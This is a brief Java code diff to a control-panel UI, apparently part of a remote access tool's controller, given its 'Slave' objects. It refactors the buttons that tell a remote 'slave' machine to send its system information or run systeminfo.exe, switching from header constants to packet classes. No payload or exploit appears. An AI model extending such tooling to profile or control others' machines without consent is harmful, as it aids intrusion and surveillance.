@@ -17,7 +17,8 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet27RefreshSystemInfo;
+import com.redpois0n.packets.outgoing.Packet83WinSysInfo;
 import com.redpois0n.ui.frames.FrameRawSystemInfo;
 import com.redpois0n.ui.renderers.table.ComputerInfoTableRenderer;
 import com.redpois0n.utils.FlagUtils;
@@ -41,7 +42,7 @@ public class PanelControlComputerInfo extends PanelControlParent {
 		btnReload.setIcon(new ImageIcon(PanelControlComputerInfo.class.getResource("/icons/update.png")));
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				slave.addToSendQueue(OutgoingHeader.REFRESH_COMPUTER_INFO);
+				slave.addToSendQueue(new Packet27RefreshSystemInfo());
 				JOptionPane.showMessageDialog(null, "Reload this dialog to refresh data", "Info", JOptionPane.INFORMATION_MESSAGE);
 			}
 		});
@@ -72,7 +73,7 @@ public class PanelControlComputerInfo extends PanelControlParent {
 			public void actionPerformed(ActionEvent arg0) {
 				FrameRawSystemInfo frame = new FrameRawSystemInfo(slave);
 				frame.setVisible(true);
-				slave.addToSendQueue(OutgoingHeader.SYSTEM_INFORMATION_EXE);	
+				slave.addToSendQueue(new Packet83WinSysInfo());	
 			}
 		});
 		btnGetSysteminfoexe.setIcon(new ImageIcon(PanelControlComputerInfo.class.getResource("/icons/down_arrow.png")));
